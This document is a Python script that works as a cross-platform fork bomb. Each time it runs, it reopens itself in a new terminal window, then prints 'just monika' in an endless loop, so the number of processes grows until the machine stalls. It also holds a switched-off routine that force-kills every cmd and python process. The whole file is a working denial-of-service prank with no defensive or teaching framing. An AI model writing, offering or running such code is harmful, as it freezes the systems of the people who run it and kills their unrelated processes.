import os
import sys
import subprocess
import threading
import time
import _thread
import platform

DEV_MODE = False  # Set to True to forcefully kill all cmd/python windows after 10 seconds

def dev_killer():
    time.sleep(10)
    if platform.system() == "Windows":
        os.system("taskkill /F /IM cmd.exe /T")
        os.system("taskkill /F /IM python.exe /T")
        _thread.interrupt_main()
    else:
        os.system("killall python")
    _thread.interrupt_main()

if DEV_MODE:
    threading.Thread(target=dev_killer, daemon=True).start()

if platform.system() == "Windows":
    subprocess.Popen([sys.executable, os.path.abspath(__file__)], creationflags=subprocess.CREATE_NEW_CONSOLE)
else:
    # Linux/Mac - try common terminal emulators
    terminals = [
        ["gnome-terminal", "--", sys.executable, os.path.abspath(__file__)],
        ["konsole", "-e", sys.executable, os.path.abspath(__file__)],
        ["kitty", "-e", sys.executable, os.path.abspath(__file__)],
        ["xfce4-terminal", "-e", f"{sys.executable} {os.path.abspath(__file__)}"],
        ["xterm", "-e", sys.executable, os.path.abspath(__file__)],
        ["open", "-a", "Terminal", os.path.abspath(__file__)]  # macOS
    ]
    
    for cmd in terminals:
        try:
            subprocess.Popen(cmd)
            break
        except FileNotFoundError:
            continue
    else:
        # Fallback: run in same process if no terminal found
        subprocess.Popen([sys.executable, os.path.abspath(__file__)])

while True:
    print("just monika")
